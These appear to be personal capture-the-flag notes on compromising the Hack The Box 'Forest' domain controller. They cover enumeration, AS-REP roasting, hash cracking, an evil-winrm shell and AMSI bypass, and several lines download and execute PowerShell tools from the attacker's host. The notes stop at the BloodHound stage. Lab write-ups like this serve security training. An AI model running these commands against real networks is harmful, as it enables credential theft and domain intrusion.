Forest

nmap -sV -sC -Pn 10.10.10.161

─$ nmap -sV -sC -Pn 10.10.10.161
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-03 03:54 EDT
Nmap scan report for 10.10.10.161
Host is up (0.28s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-08-03 08:02:30Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h26m52s, deviation: 4h02m31s, median: 6m50s
| smb2-time: 
|   date: 2022-08-03T08:02:47
|_  start_date: 2022-08-03T07:58:59
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2022-08-03T01:02:49-07:00


rpcclient -U "" 10.10.10.161 
Password for [WORKGROUP\]:
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE

└─$ smbclient -L 10.10.10.161
Password for [WORKGROUP\kali]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.161 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

Try specifying workgroup

smbclient -N -L \\\\10.10.10.161\\

no luck with SMB

nmap -Pn --script msrpc-enum 10.10.10.161

nmap -Pn -p 445 --script smb-vuln-* 10.10.10.161

no luck on either. scan all ports

nmap -p0-65535 -Pn 10.10.10.161 

5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49664/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49684/tcp open  unknown
49706/tcp open  unknown
49945/tcp open  unknown

nmap -sV -sC -Pn -p5985,9389,47001,49664,49666,49667,49671,49676,49677,49684,49706,49945 10.10.10.161

nmap -sV -sC -Pn -p5985,9389,47001,49664,49666,49667,49671,49676,49677,49684,49706,49945 10.10.10.161

PORT      STATE SERVICE    VERSION
5985/tcp  open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf     .NET Message Framing
47001/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc      Microsoft Windows RPC
49666/tcp open  msrpc      Microsoft Windows RPC
49667/tcp open  msrpc      Microsoft Windows RPC
49671/tcp open  msrpc      Microsoft Windows RPC
49676/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc      Microsoft Windows RPC
49684/tcp open  msrpc      Microsoft Windows RPC
49706/tcp open  msrpc      Microsoft Windows RPC
49945/tcp open  msrpc      Microsoft Windows RPC

HTTPAPI httpd 2.0 looks sussy.
yep.

https://www.sikich.com/insight/ms15-034-critical-windows-vulnerability-need-know-now/

curl -v 10.10.10.161 -H "Range: bytes=00-18446744073709551615"

nothing good. no vuln.

time to try ldap
nmap -sT -Pn -n --open 10.10.10.161 -p389 --script ldap-rootdse

dnsHostName: FOREST.htb.local

msf6 > use scanner/smb/smb_lookupsid
set RHOSTS 10.10.10.161

no luck, lets DNS enumerate

dig srv _ldap._tcp.dc._msdcs.forest.htb.local @10.10.10.161

; <<>> DiG 9.18.1-1-Debian <<>> srv _ldap._tcp.dc._msdcs.forest.htb.local @10.10.10.161
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 30962
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
; COOKIE: c6b2e53f11ba33f4 (echoed)
;; QUESTION SECTION:
;_ldap._tcp.dc._msdcs.forest.htb.local. IN SRV

;; AUTHORITY SECTION:
htb.local.              3600    IN      SOA     forest.htb.local. hostmaster.htb.local. 106 900 600 86400 3600

;; Query time: 276 msec
;; SERVER: 10.10.10.161#53(10.10.10.161) (UDP)
;; WHEN: Wed Aug 03 07:22:14 EDT 2022
;; MSG SIZE  rcvd: 141

dig axfr forest.htb @10.10.10.161

added to hosts, no luck.

found that i need -N in my rpcclient payload
rpcclient -U "" -N 10.10.10.161

enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]

rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Organization Management] rid:[0x450]
group:[Recipient Management] rid:[0x451]
group:[View-Only Organization Management] rid:[0x452]
group:[Public Folder Management] rid:[0x453]
group:[UM Management] rid:[0x454]
group:[Help Desk] rid:[0x455]
group:[Records Management] rid:[0x456]
group:[Discovery Management] rid:[0x457]
group:[Server Management] rid:[0x458]
group:[Delegated Setup] rid:[0x459]
group:[Hygiene Management] rid:[0x45a]
group:[Compliance Management] rid:[0x45b]
group:[Security Reader] rid:[0x45c]
group:[Security Administrator] rid:[0x45d]
group:[Exchange Servers] rid:[0x45e]
group:[Exchange Trusted Subsystem] rid:[0x45f]
group:[Managed Availability Servers] rid:[0x460]
group:[Exchange Windows Permissions] rid:[0x461]
group:[ExchangeLegacyInterop] rid:[0x462]
group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]
group:[Service Accounts] rid:[0x47c]
group:[Privileged IT Accounts] rid:[0x47d]
group:[test] rid:[0x13ed]

rpcclient $> querygroup 0x200
        Group Name:     Domain Admins
        Description:    Designated administrators of the domain
        Group Attribute:7
        Num Members:1
rpcclient $> querygroupmem 0x200
        rid:[0x1f4] attr:[0x7]
rpcclient $> queryuser 0x1f4
        User Name   :   Administrator
        Full Name   :   Administrator
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :   Built-in account for administering the computer/domain
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Wed, 03 Aug 2022 03:59:46 EDT
        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
        Kickoff Time             :      Wed, 31 Dec 1969 19:00:00 EST
        Password last set Time   :      Mon, 30 Aug 2021 20:51:59 EDT
        Password can change Time :      Tue, 31 Aug 2021 20:51:59 EDT
        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
        unknown_2[0..31]...
        user_rid :      0x1f4
        group_rid:      0x201
        acb_info :      0x00000010
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000061
        padding1[0..7]...
        logon_hrs[0..21]...


rpcclient $> createdomuser netrunner
result was NT_STATUS_ACCESS_DENIED


compiled users down into users.txt
DefaultAccount
sebastien
lucinda
andy
mark
santi


crackmapexec smb 10.10.10.161 -u users.txt -p /usr/share/wordlists/rockyou.txt

no luck

look around the internet for other common tools
Impacket > GetNPUsers

python3 GetNPUsers.py 10.10.10.161

python3 GetNPUsers.py forest.htb.local/ -dc-ip 10.10.10.161
python3 GetNPUsers.py forest.local/ -dc-ip 10.10.10.161
win: python3 GetNPUsers.py htb.local/ -dc-ip 10.10.10.161

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2022-08-04 05:32:14.999391  2022-08-04 05:32:55.796298  0x410200 


win: python3 GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -request

$krb5asrep$23$svc-alfresco@HTB.LOCAL:812cfb5454107edd34d5d8ef2023d2ae$5ca1cb5ff5f2f0ccb73b93d0ea0581fce80538e16266df11b1e0686bc63fc37ea3a84bd6348d33dc100704708aebb0b9bc561ceeec36f5048506032280e9246be125a386e781efde7bd00a6b79c1f4ae9ef344b82aeb84df54fe5f4194705e7dc1af27c005ef4bcf31a1b1eb92c08dac777cfe5f2d17a2f786ddd5444ba71672d5ca0e4e97a9fa493fafd4dbf1c0653dfed65b007d1669e2be3ddef5d918af3cc12eb497dea9c630d6ae0ed6db2e25c83dcfc3fe42f3240cbce0180cf3486c2eb2de2f844879ff247497ec5fa9d54ece0a9e244d2a32f2b2e72c5bbf2e2c1ee33e75277eec16

navigated to here
https://hashcat.net/wiki/doku.php?id=example_hashes
found that the hash type we're looking for is 18200

hashcat -m 18200 -a 0 forest_hash /usr/share/wordlists/rockyou.txt
Really naughty, but I had to use --force

Spat out: s3rvice

How does it work:
        This provides us with a hash. There isn't a password actually in the hash, instead it's a value thats salted with. If we can work out part of the data with a word list, looking fora  certain part is always the same, the password is correct.

        the GetNPUsers script is essentially searching for a bitwise value in "UserAccountControl" in the target AD. The paramters we need to perform this exploit are "UF_DONT_REQUIRE_PREAUTH" and "UF_ACCOUNTDISABLE".

        The script creates a kerberos request (AS-REQ) for the server for a username, and ask for a weakly encrypted response in the form of eTYPE-ARCFOUR-HMAC-MD5(AS-REP). This is important as kerberos will usually send its response in a much stronger encrypted format.

        If preauth is required, when performing GetNPUSers, Kerberos will require a password. This password requires the user to encrypt the current time with the users password (encryptiong the current time prevents replay attacks)

evilwinrm time
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice

USER FLAG HERE from desktop

winpeas enumeration
sudo python3 -m http.server 80

powershell "Invoke-WebRequest -UseBasicParsing 10.10.14.8/winPEAS.bat -OutFile winPEAS.bat"

nothing exiting

Bypass-4MSI
-bypass firewalls

changed to a directory with powerview.ps1, hosted another server
iex(new-object net.webclient).downloadstring('http://10.10.14.8:80/powerview.ps1')

menu before
[+] Dll-Loader 
[+] Donut-Loader 
[+] Invoke-Binary
[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] menu
[+] exit



menu after
[+] Add-DomainGroupMember 
[+] Add-DomainObjectAcl 
[+] Add-NetUser 
[+] Add-RemoteConnection 
[+] Add-Win32Type 
[+] Convert-ADName 
[+] Convert-DNSRecord 
[+] ConvertFrom-LDAPLogonHours 
[+] ConvertFrom-SID 
[+] ConvertFrom-UACValue 
[+] Convert-LDAPProperty 
[+] ConvertTo-SID 
[+] Dll-Loader 
[+] Donut-Loader 
[+] Export-PowerViewCSV 
[+] field 
[+] Find-DomainLocalGroupMember 
[+] Find-DomainObjectPropertyOutlier 
[+] Find-DomainProcess 
[+] Find-DomainShare 
[+] Find-DomainUserEvent 
[+] Find-DomainUserLocation 
[+] Find-InterestingDomainAcl 
[+] Find-InterestingDomainShareFile 
[+] Find-InterestingFile 
[+] Find-LocalAdminAccess 
[+] func 
[+] Get-Domain 
[+] Get-DomainComputer 
[+] Get-DomainController 
[+] Get-DomainDFSShare 
[+] Get-DomainDNSRecord 
[+] Get-DomainDNSZone 
[+] Get-DomainFileServer 
[+] Get-DomainForeignGroupMember 
[+] Get-DomainForeignUser 
[+] Get-DomainGPO 
[+] Get-DomainGPOComputerLocalGroupMapping 
[+] Get-DomainGPOLocalGroup 
[+] Get-DomainGPOUserLocalGroupMapping 
[+] Get-DomainGroup 
[+] Get-DomainGroupMember 
[+] Get-DomainGroupMemberDeleted 
[+] Get-DomainGUIDMap 
[+] Get-DomainManagedSecurityGroup 
[+] Get-DomainObject 
[+] Get-DomainObjectAcl 
[+] Get-DomainObjectAttributeHistory 
[+] Get-DomainObjectLinkedAttributeHistory 
[+] Get-DomainOU 
[+] Get-DomainPolicyData 
[+] Get-DomainSearcher 
[+] Get-DomainSID 
[+] Get-DomainSite 
[+] Get-DomainSPNTicket 
[+] Get-DomainSubnet 
[+] Get-DomainTrust 
[+] Get-DomainTrustMapping 
[+] Get-DomainUser 
[+] Get-DomainUserEvent 
[+] Get-FineGrainedPasswordPolicy 
[+] Get-Forest 
[+] Get-ForestDomain 
[+] Get-ForestGlobalCatalog 
[+] Get-ForestSchemaClass 
[+] Get-ForestTrust 
[+] Get-GPODelegation 
[+] Get-GptTmpl 
[+] Get-GroupsXML 
[+] Get-IniContent 
[+] Get-NetComputerSiteName 
[+] Get-NetGmsa 
[+] Get-NetLocalGroup 
[+] Get-NetLocalGroupMember 
[+] Get-NetLoggedon 
[+] Get-NetRDPSession 
[+] Get-NetSession 
[+] Get-NetShare 
[+] Get-PathAcl 
[+] Get-PrincipalContext 
[+] Get-RegLoggedOn 
[+] Get-WMIProcess 
[+] Get-WMIRegCachedRDPConnection 
[+] Get-WMIRegLastLoggedOn 
[+] Get-WMIRegMountedDrive 
[+] Get-WMIRegProxy 
[+] Invoke-Binary 
[+] Invoke-DowngradeAccount 
[+] Invoke-Kerberoast 
[+] Invoke-RevertToSelf 
[+] Invoke-UserImpersonation 
[+] New-ADObjectAccessControlEntry 
[+] New-DomainGroup 
[+] New-DomainUser 
[+] New-DynamicParameter 
[+] New-GPOImmediateTask 
[+] New-InMemoryModule 
[+] New-ThreadedFunction 
[+] psenum 
[+] Remove-DomainGroupMember 
[+] Remove-DomainObjectAcl 
[+] Remove-RemoteConnection 
[+] Resolve-IPAddress 
[+] Set-DomainObject 
[+] Set-DomainObjectOwner 
[+] Set-DomainUserPassword 
[+] struct 
[+] Test-AdminAccess 
[+] Test-Administrator
[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] menu
[+] exit


change directory to /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1
iex(new-object net.webclient).downloadstring('http://10.10.14.8:80/PowerUp.ps1')

looking for Invoke-AllChecks
        invokes all functions that powerup has

AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\svc-alfresco\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

https://github.com/securycore/Ikeext-Privesc

iex(new-object net.webclient).downloadstring('http://10.10.14.8:80/Ikeext-Privesc.ps1')

Invoke-IkeextCheck

nope

logoncount                      : 97
badpasswordtime                 : 8/31/2021 6:56:53 AM
description                     : Built-in account for administering the computer/domain
mailnickname                    : Administrator
distinguishedname               : CN=Administrator,CN=Users,DC=htb,DC=local
objectclass                     : {top, person, organizationalPerson, user}
displayname                     : Administrator
lastlogontimestamp              : 8/4/2022 2:12:51 AM
userprincipalname               : Administrator@htb.local
msexchuseraccountcontrol        : 0
objectguid                      : a8133c53-217c-40e2-81cb-887e0f61bdb0
primarygroupid                  : 513
objectsid                       : S-1-5-21-3072663084-364016917-1341370565-500
msexchmailboxsecuritydescriptor : {1, 0, 4, 128...}
logonhours                      : {255, 255, 255, 255...}
msexchelcmailboxflags           : 130
codepage                        : 0
msexchhomeservername            : /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=EXCH01
samaccounttype                  : USER_OBJECT
msexchumdtmfmap                 : {emailAddress:2364647872867, lastNameFirstName:2364647872867, firstNameLastName:2364647872867}
msexchrbacpolicylink            : CN=Default Role Assignment Policy,CN=Policies,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
accountexpires                  : 12/31/1600 4:00:00 PM
cn                              : Administrator
whenchanged                     : 8/4/2022 9:12:51 AM
instancetype                    : 4
samaccountname                  : Administrator
name                            : Administrator
msexchpoliciesincluded          : {f5cca5ec-fafc-4e09-8b7f-be05572cb7cb, {26491cfc-9e50-4857-861b-0cb8df22b5d7}}
msexchcalendarloggingquota      : 6291456
lastlogon                       : 8/4/2022 2:13:15 AM
msexcharchivewarnquota          : 94371840
msexcharchivequota              : 104857600
objectcategory                  : CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
dscorepropagationdata           : {8/4/2022 10:47:01 AM, 8/4/2022 10:47:01 AM, 8/4/2022 10:47:01 AM, 8/4/2022 10:47:01 AM...}
legacyexchangedn                : /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=6a918be344de43c78fc5d0609fcafb4d-Admin
msexchdumpsterquota             : 31457280
msexchwhenmailboxcreated        : 9/19/2019 11:47:08 AM
memberof                        : {CN=Organization Management,OU=Microsoft Exchange Security Groups,DC=htb,DC=local, CN=Group Policy Creator Owners,CN=Users,DC=htb,DC=local, CN=Domain Admins,CN=Users,DC=htb,DC=local, CN=Enterprise
                                  Admins,CN=Users,DC=htb,DC=local...}
mdbusedefaults                  : True
whencreated                     : 9/18/2019 5:45:57 PM
showinaddressbook               : {CN=Mailboxes(VLV),CN=All System Address Lists,CN=Address Lists Container,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local, CN=All Mailboxes(VLV),CN=All System Address
                                  Lists,CN=Address Lists Container,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local, CN=All Recipients(VLV),CN=All System Address Lists,CN=Address Lists Container,CN=First
                                  Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local, CN=Default Global Address List,CN=All Global Address Lists,CN=Address Lists Container,CN=First Organization,CN=Microsoft
                                  Exchange,CN=Services,CN=Configuration,DC=htb,DC=local...}
iscriticalsystemobject          : True
msexchrecipientdisplaytype      : 1073741824
admincount                      : 1
badpwdcount                     : 0
proxyaddresses                  : SMTP:Administrator@htb.local
msexchrecipienttypedetails      : 1
useraccountcontrol              : NORMAL_ACCOUNT
usncreated                      : 8196
protocolsettings                : RemotePowerShell§1
countrycode                     : 0
msexchversion                   : 88218628259840
pwdlastset                      : 8/30/2021 5:51:58 PM
mail                            : Administrator@htb.local
usnchanged                      : 888877
msexchmailboxguid               : {191, 40, 99, 21...}
homemdb                         : CN=Mailbox Database 1118319013,CN=Databases,CN=Exchange Administrative Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
lastlogoff                      : 12/31/1600 4:00:00 PM
msexchdumpsterwarningquota      : 20971520

C:\Users\svc-alfresco> Get-NetLoggedon -ComputerName htb.local


UserName     : Administrator
LogonDomain  : HTB
AuthDomains  :
LogonServer  : FOREST
ComputerName : htb.local

UserName     : Administrator
LogonDomain  : HTB
AuthDomains  :
LogonServer  : FOREST
ComputerName : htb.local

UserName     : FOREST$
LogonDomain  : HTB
AuthDomains  :
LogonServer  :
ComputerName : htb.local


iex(new-object net.webclient).downloadstring('http://10.10.14.8:80/Get-KerberosServiceTicket.ps1')
iex(new-object net.webclient).downloadstring('http://10.10.14.8:80/SharpHound.ps1')

Get-DomainUser svc-alfresco

C:\Users\svc-alfresco\Documents> Get-DomainUser svc-alfresco
distinguishedname             : CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local
memberof                      : CN=Service Accounts,OU=Security Groups,DC=htb,DC=local

neo4j console
